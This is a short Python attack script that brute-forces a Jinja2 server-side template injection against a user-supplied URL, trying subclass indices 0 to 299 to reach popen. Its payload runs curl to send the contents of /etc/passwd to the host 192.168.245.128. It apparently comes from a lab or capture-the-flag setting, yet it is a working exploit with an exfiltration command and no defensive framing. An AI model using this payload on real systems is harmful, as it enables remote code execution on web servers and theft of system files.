import requests

url = input("url:")
for i in range(300):
    try:
        data = {"code": '{{ ().__class__.__base__.__subclasses__()[' + str(
            i) + '].__init__.__globals__["popen"]("curl http://192.168.245.128/`cat /etc/passwd`").read() }}'}
        response = requests.post(url, data=data)
    except:
        pass
